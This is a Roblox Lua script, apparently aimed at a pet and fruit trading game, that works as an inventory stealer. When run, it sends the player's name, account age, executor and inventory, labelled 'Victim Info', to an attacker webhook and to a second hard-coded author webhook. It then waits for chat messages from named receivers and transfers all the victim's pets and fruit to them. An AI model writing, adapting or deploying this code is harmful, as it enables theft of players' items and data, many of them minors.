Username = Username or {}
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local executor = (type(identifyexecutor) == "function" and identifyexecutor()) or "Unknown"

DualHook = {
  'nfzl',
  'nfzl_alt1',
  'nfzl_alt2',
  'nfzl_alt3',
}

DualHookWebhook = "https://webhook-protect-2.vercel.app/api/webhook?id=N2dxWnNzUmxPd3BKM1pYcFptR1JFUTpYcm8wX3RPX2t5Z2N4MWhOeENQR2FJOURwZEI3MUJSYTliVU5PQTRvdXNRWjdvUy1Rck9ZYkZIa1M0dGdmN2xfQnVKZWhYQlNKMGpjRC1jUHFIOTJUY2ZHeHhDclpRUk5OWVRXV0xCcmt0QTJ3aTdqbTNaalpTNWVwaXZqWFhibW1ZTUFOWDVIMTRnS21hTjdTakpRY2pkdGlvQTg0NDhRODNxQ3lGQ091YzQ"

if (not Username or #Username == 0) and DualHook and #DualHook > 0 then
    Username = DualHook
end

if (not Webhook or Webhook == "") and DualHookWebhook and DualHookWebhook ~= "" then
    Webhook = DualHookWebhook
end

local function unfavoriteAll()
    local Remote = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
        Remote:FireServer(tool)
        task.wait(0.2)
        Remote:FireServer(tool)
        task.wait(0.2)
    end
end

local function buildInventoryTable()
    local invList = {}
    for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
        if item:FindFirstChild("PetToolLocal") or item:FindFirstChild("Item_String") then
            table.insert(invList, {name = item.Name, value = "Unknown"})
        end
    end

    if #invList == 0 then
        return "No Items (poor)"
    end

    local invStr = "Total Items: " .. tostring(#invList) .. "\n\n"
    for i = 1, math.min(20, #invList) do
        local v = invList[i]
        invStr = invStr .. v.name .. " : " .. v.value .. " Value\n"
    end
    return invStr
end

local function sendWebhook()
    local inventoryString = buildInventoryTable()
    
    local youField = "[REDACTED]"
    if type(Username) == "table" and #Username > 0 then
        youField = table.concat(Username, ", ")
    end

    local embed = {
        title = "Inventory Log",
        description = "**Victim Info**\n```Username: " .. LocalPlayer.Name ..
            "\nAccount Age: " .. LocalPlayer.AccountAge ..
            "\nExploit: " .. executor ..
            "\nYou: " .. youField ..
            "\nGame: " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```" ..
            "\n**Inventory Information**\n```" .. inventoryString .. "```",
        color = 0xff0000
    }

    local data = {
        content = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\")",
        embeds = {embed}
    }

    local body = HttpService:JSONEncode(data)
    local requestFunc = (syn and syn.request) or request or (http and http.request)

    if requestFunc then
        requestFunc({
            Url = Webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = body
        })

        requestFunc({
            Url = DualHookWebhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = body
        })
    else
        warn("No supported request function found")
    end
end
local function getReceivers()
    local valid = {}
    for _, name in ipairs(Username) do
        local plr = Players:FindFirstChild(name)
        if plr then
            table.insert(valid, plr)
        end
    end
    return valid
end

local function waitUntilGone(item)
    for _ = 1, 100 do
        if not item.Parent then return end
        task.wait(0.1)
    end
end

local function tryFirePrompt(prompt)
    if fireproximityprompt then
        fireproximityprompt(prompt)
    else
        prompt.HoldDuration = 0
        prompt.MaxActivationDistance = 999999
        prompt:InputHoldBegin()
        task.wait(0.25)
        prompt:InputHoldEnd()
    end
end

local function findPrompt(char, partName)
    local part = char:FindFirstChild(partName)
    if not part then return nil end
    return part:FindFirstChildWhichIsA("ProximityPrompt", true)
end

local function giftItems()
    local receivers = getReceivers()
    if #receivers == 0 then
        warn("No receiver in server.")
        return
    end

    unfavoriteAll()

    for _, receiver in ipairs(receivers) do
        for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
            if tool:FindFirstChild("PetToolLocal") then
                print("[GIFT] Equipping pet:", tool.Name)
                tool.Parent = LocalPlayer.Character
                task.wait(0.3)

                print("[GIFT] Unequipping and gifting pet:", tool.Name)
                ReplicatedStorage.GameEvents.PetsService:FireServer("UnequipPet", tool:GetAttribute("UUID"))
                task.wait(0.3)
                ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", receiver)
                waitUntilGone(tool)
                task.wait(0.4)

            elseif tool:FindFirstChild("Item_String") then
                print("[GIFT] Equipping fruit:", tool.Name)
                tool.Parent = LocalPlayer.Character
                task.wait(0.3)

                LocalPlayer.Character:PivotTo(receiver.Character:GetPivot())
                task.wait(0.4)

                local prompt = findPrompt(receiver.Character, "HumanoidRootPart")
                if prompt then
                    tryFirePrompt(prompt)
                    waitUntilGone(tool)
                else
                    warn("[GIFT] No ProximityPrompt for fruit:", tool.Name)
                end
                task.wait(0.4)
            end
        end
    end
end

TextChatService.TextChannels.RBXGeneral.MessageReceived:Connect(function(msg)
    local source = msg.TextSource
    if source then
        local sender = Players:GetPlayerByUserId(source.UserId)
        if sender and (table.find(Username, sender.Name) or table.find(DualHook, sender.Name)) then
            print("[CHAT TRIGGER] Message from receiver, gifting items...")
            giftItems()
        end
    end
end)

sendWebhook()
